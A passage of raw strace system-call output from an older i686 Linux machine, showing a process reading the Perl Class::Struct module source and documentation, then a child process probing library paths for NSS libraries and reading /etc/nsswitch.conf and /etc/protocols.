$decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
7464  07:18:53.302119 brk(0x82de000)    = 0x82de000
7464  07:18:53.302534 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
7464  07:18:53.303132 _llseek(10, 6916, [6916], SEEK_SET) = 0
7464  07:18:53.303151 _llseek(10, 0, [6916], SEEK_CUR) = 0
7464  07:18:53.303188 close(10)         = 0
7464  07:18:53.303375 _llseek(8, 1334, [1334], SEEK_SET) = 0
7464  07:18:53.303391 _llseek(8, 0, [1334], SEEK_CUR) = 0
7464  07:18:53.303401 close(8)          = 0
7464  07:18:53.304045 brk(0x82ff000)    = 0x82ff000
7464  07:18:53.304250 _llseek(6, 2689, [2689], SEEK_SET) = 0
7464  07:18:53.304267 _llseek(6, 0, [2689], SEEK_CUR) = 0
7464  07:18:53.304277 close(6)          = 0
7464  07:18:53.304416 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7db8908) = 7465
7465  07:18:53.326173 getppid()         = 7464
7465  07:18:53.326486 open("/etc/nsswitch.conf", O_RDONLY) = 6
7465  07:18:53.326510 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7465  07:18:53.326530 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f7e000
7465  07:18:53.326544 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7465  07:18:53.326598 read(6, "", 4096) = 0
7465  07:18:53.326608 close(6)          = 0
7465  07:18:53.326618 munmap(0xb7f7e000, 4096) = 0
7465  07:18:53.326645 open("/etc/ld.so.cache", O_RDONLY) = 6
7465  07:18:53.326658 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7465  07:18:53.326674 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d85000
7465  07:18:53.326685 close(6)          = 0
7465  07:18:53.326696 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7465  07:18:53.326715 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326729 stat64("/lib/tls/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.326743 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326756 stat64("/lib/tls/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.326767 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326780 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.326797 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326810 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.326826 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326839 stat64("/lib/tls/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.326850 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326862 stat64("/lib/tls/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.326873 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326884 stat64("/lib/tls/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.326907 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326920 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.326963 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.326993 stat64("/lib/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327004 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327015 stat64("/lib/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327026 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327038 stat64("/lib/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327048 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327060 stat64("/lib/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327071 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327082 stat64("/lib/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327093 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327104 stat64("/lib/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327115 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327127 stat64("/lib/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327137 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327151 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.327168 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327181 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327193 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327205 stat64("/usr/lib/tls/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327216 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327229 stat64("/usr/lib/tls/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327240 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327252 stat64("/usr/lib/tls/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327263 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327275 stat64("/usr/lib/tls/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327286 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327298 stat64("/usr/lib/tls/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327309 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327321 stat64("/usr/lib/tls/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327332 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327343 stat64("/usr/lib/tls", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327354 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327367 stat64("/usr/lib/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327378 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327399 stat64("/usr/lib/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327413 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327500 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.327518 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327531 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.327547 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327560 stat64("/usr/lib/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327571 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327582 stat64("/usr/lib/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327593 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327605 stat64("/usr/lib/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327616 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327627 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
7465  07:18:53.327643 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327656 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327669 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327682 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327693 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327709 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327721 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327734 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327746 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327759 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327771 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327783 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327795 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327807 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327819 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327831 stat64("/lib/i486-linux-gnu/tls", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327842 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327855 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327867 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327880 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327902 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.327915 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.327957 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328003 stat64("/lib/i486-linux-gnu/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328014 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328027 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328039 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328051 stat64("/lib/i486-linux-gnu/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328063 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328075 stat64("/lib/i486-linux-gnu/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328086 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328099 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.328116 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328129 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328142 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328155 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328168 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328181 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328193 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328210 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328222 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328235 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328247 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328260 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328272 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328285 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328297 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328309 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328321 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328334 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328347 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328360 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328372 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328384 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328420 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328434 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328446 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328461 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328473 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328487 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328512 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328525 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfa6cf0c) = -1 ENOENT (No such file or directory)
7465  07:18:53.328536 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7465  07:18:53.328549 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7465  07:18:53.328568 munmap(0xb7d85000, 29913) = 0
7465  07:18:53.328588 open("/etc/ld.so.cache", O_RDONLY) = 6
7465  07:18:53.328600 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7465  07:18:53.328616 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d85000
7465  07:18:53.328627 close(6)          = 0
7465  07:18:53.328637 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7465  07:18:53.328651 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
7465  07:18:53.328666 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7465  07:18:53.328758 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7465  07:18:53.328779 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d7a000
7465  07:18:53.328791 mmap2(0xb7d83000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d83000
7465  07:18:53.328807 close(6)          = 0
7465  07:18:53.328831 munmap(0xb7d85000, 29913) = 0
7465  07:18:53.328859 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7465  07:18:53.328902 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7465  07:18:53.328918 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7465  07:18:53.328968 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d8c000
7465  07:18:53.328979 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing 